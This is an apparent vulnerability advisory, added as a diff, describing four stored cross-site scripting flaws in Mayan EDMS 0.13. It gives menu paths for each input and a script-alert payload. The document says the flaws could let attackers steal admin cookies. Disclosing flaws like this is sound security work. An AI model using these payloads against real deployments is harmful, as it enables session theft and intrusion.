@@ -1,0 +1,44 @@
+# Exploit Title: Multiple Stored XSS
+# Software: Maya EDMS
+# Software Link: http://www.mayan-edms.com/downloads/Mayan%20EDMS%20v0.13.ova
+# Version: 0.13 - latest
+# Author: Dolev Farhi, email: dolev(at)openflare(dot)org   @f1nhack
+# Date: 21.5.2014
+# Tested on: Kali Linux
+# Vendor homepage: www.mayan-edms.com
+
+
+
+1. About the application:
+=========================
+Mayan (or Mayan EDMS) is a web-based free/libre document management system for managing documents within an organization
+
+
+2. Vulnerability Description:
+===============================
+An attacker is able to create documents and tags with malicious code, potentially stealing admin cookies browsing or editing the documents.
+
+
+3. Steps to reproduce:
+========================
+* Stored XSS 1:
+Tags -> Create new tag -> <script>alert("XSS")</script> -> Save
+
+any navigation to documents or search will execute the XSS
+
+* Stored XSS 2: 
+Setup -> Sources -> Staging folders -> Add new source -> Title it: <script>alert("XSS")</script> 
+Submit -> navigate to edit it again -> XSS executes
+
+* Stored XSS 3:
+Setup -> Bootstrap -> Create new bootstrap setup -> Name <script>alert("XSS")</script> -> submit -> XSS
+
+* Stored XSS 4:
+Setup -> Smart links -> Create new smart link -> Title it <script>alert("XSS")</script> -> submit -> edit -> XSS executes
+
+
+5. Proof of concept video
+http://research.openflare.org/poc/maya-edms/maya-edms_multiple_xss.avi
+
+
+  
